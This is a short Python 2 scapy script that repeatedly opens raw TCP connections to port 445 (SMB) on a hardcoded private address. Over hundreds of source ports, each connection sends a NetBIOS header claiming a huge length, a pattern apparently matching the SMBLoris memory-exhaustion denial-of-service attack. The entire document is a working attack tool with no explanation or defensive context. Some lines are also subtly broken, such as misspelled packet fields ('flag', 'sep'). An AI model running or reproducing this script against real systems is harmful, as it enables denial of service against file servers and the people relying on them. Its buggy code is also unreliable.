from scapy.all import *
import sys

p0 = int(sys.argv[1])

conf.L3socket
conf.L3socket=L3RawSocket

i = IP()
i.dst = "192.168.2.186"
t = TCP()
t.dport = 445

for p in range(p0,p0+700):
   print p
   t.sport = p
   t.flag = "S"

   r = sr1(i/t)
   rt = r[TCP]
   t.ack = rt.seq + 1
   t.sep = rt.ack
   t.flags = "A"
   sbss = '\x00\x01\xff\xff'
   send(i/t/sbss)